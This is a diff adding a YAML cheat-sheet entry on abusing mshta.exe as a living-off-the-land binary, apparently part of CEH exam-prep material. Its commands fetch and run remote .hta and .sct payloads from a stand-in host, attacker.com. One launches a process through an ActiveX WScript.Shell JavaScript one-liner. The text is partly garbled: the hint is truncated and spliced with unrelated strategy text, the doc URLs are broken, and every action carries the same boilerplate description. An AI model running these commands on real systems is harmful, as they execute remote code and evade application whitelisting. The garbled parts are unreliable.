@@ -1,0 +1,26 @@
+tool: mshta
+tags:
+- m11
+- network
+- cli
+exam_hint: 'mshta.exe (Microsoft HTML Application Host) is a legitimate Windows system binary that executes HTML Application (.hta) files. Threat actors abuse it as a Living-Off-the-Land Binary (LOLBAS) to execute malicious VBScript or JScript payloads without writing to disk, bypassing application whitelisting controls that block unknown executables. Because mshta.exe is a signed Microsoft binary, it often e Strategy: nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on th'
+docs:
+- http://attacker.com/payload.hta`.
+- http://`
+- http://attacker.com/payload.hta
+actions:
+- title: Mshta.exe C:\payload.hta
+  desc: Runs `mshta.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: mshta.exe C:\payload.hta
+- title: Mshta.exe http://attacker.com/payload.hta
+  desc: Runs `mshta.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: mshta.exe http://attacker.com/payload.hta
+- title: Mshta.exe https://attacker.com/payload.hta
+  desc: Runs `mshta.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: mshta.exe https://attacker.com/payload.hta
+- title: Mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a
+  desc: Runs `mshta.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe /c calc.exe',0);close();"
+- title: Mshta.exe vbscript:Close(Execute("GetObject(""script:http://
+  desc: Runs `mshta.exe` as part of the CEH workflow. nc/socat for relays; curl/wget for payload staging; tcpdump/tshark with BPF filters on the pivot interface to limit noise. Authorized lab targets only.
+  command: mshta.exe vbscript:Close(Execute("GetObject(""script:http://attacker.com/payload.sct"")"))
